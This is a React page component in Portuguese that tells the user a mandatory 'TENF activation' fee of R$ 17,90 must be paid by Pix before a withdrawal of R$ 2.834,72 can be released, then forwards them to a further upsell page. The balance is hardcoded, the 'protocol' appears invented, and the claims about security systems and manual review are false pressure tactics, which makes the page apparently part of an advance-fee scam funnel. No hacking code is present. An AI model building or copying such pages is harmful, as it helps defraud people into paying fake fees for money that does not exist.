import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import MoneyForPayPopup from '@/components/MoneyForPayPopup';
import { trackViewContent } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_FINAL = 2834.72;
const TAXA_TENF = 17.90;
const TAXA_TENF_CENTAVOS = 1790;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up1 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Ativação TENF', TAXA_TENF);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up2');
  };

  return (
    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '40px' }}>
      <div className="title">Ativação TENF</div>

      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px',
        padding: '20px',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <h1 style={{
          fontSize: '22px',
          fontWeight: 700,
          color: '#000',
          margin: '0 0 16px',
          lineHeight: 1.3,
        }}>
          Ativação TENF obrigatória para saques acima de R$ 1.500
        </h1>

        <p style={{
          fontSize: '14px',
          color: '#000',
          margin: '0 0 20px',
          lineHeight: 1.5,
        }}>
          Para concluir a liberação do seu saque de{' '}
          <span style={{ color: '#fe2b54', fontWeight: 600 }}>R$ {formatBR(SALDO_FINAL)}</span>
          , é obrigatório ativar o protocolo TENF.
        </p>

        <div style={{
          backgroundColor: '#f8f9fb',
          borderRadius: '8px',
          padding: '14px',
          marginBottom: '20px',
        }}>
          <p style={{
            fontSize: '13px',
            color: '#666',
            margin: 0,
            lineHeight: 1.5,
          }}>
            Saque sem TENF não é processado pelo sistema de segurança e é automaticamente direcionado para análise manual, o que impede a liberação do valor.
          </p>
        </div>

        <h2 style={{
          fontSize: '14px',
          fontWeight: 600,
          color: '#000',
          margin: '0 0 12px',
        }}>
          O TENF é exigido para:
        </h2>

        <ul style={{
          margin: '0 0 20px',
          paddingLeft: '0',
          listStyle: 'none',
        }}>
          {[
            'Validar identidade',
            'Confirmar origem do saldo',
            'Autorizar liberação de valores elevados',
            'Evitar bloqueios e retenções',
          ].map((item, idx) => (
            <li key={idx} style={{
              fontSize: '14px',
              color: '#444',
              padding: '6px 0',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
            }}>
              <span style={{
                width: '6px',
                height: '6px',
                borderRadius: '50%',
                backgroundColor: '#fe2b54',
                flexShrink: 0,
              }} />
              {item}
            </li>
          ))}
        </ul>

        <div style={{
          backgroundColor: '#f8f9fb',
          borderRadius: '8px',
          padding: '14px',
          marginBottom: '24px',
        }}>
          <p style={{
            fontSize: '13px',
            color: '#666',
            margin: 0,
            lineHeight: 1.5,
          }}>
            Sem a ativação, o saque permanece pendente e não é liberado.
          </p>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          marginBottom: '16px',
        }}>
          <span style={{ fontSize: '14px', fontWeight: 500, color: '#000' }}>
            Valor da ativação
          </span>
          <span style={{ fontSize: '20px', fontWeight: 700, color: '#000' }}>
            R$ {formatBR(TAXA_TENF)}
          </span>
        </div>

        <button
          onClick={() => setShowPixPopup(true)}
          style={{
            width: '100%',
            padding: '14px',
            backgroundColor: '#fe2b54',
            color: '#fff',
            border: 'none',
            borderRadius: '99px',
            fontSize: '15px',
            fontWeight: 600,
            cursor: 'pointer',
          }}
        >
          Ativar TENF obrigatório
        </button>

        <p style={{
          fontSize: '12px',
          color: '#888',
          textAlign: 'center',
          marginTop: '12px',
          marginBottom: 0,
        }}>
          A ativação é obrigatória para saques acima de R$ 1.500
        </p>
      </div>

      {showPixPopup && (
        <MoneyForPayPopup
          amount={TAXA_TENF_CENTAVOS}
          productName="Ativação TENF obrigatório"
          pageOrigin="Up1"
          onSuccess={handlePaymentSuccess}
          onClose={() => setShowPixPopup(false)}
        />
      )}
    </main>
  );
};

export default Up1;
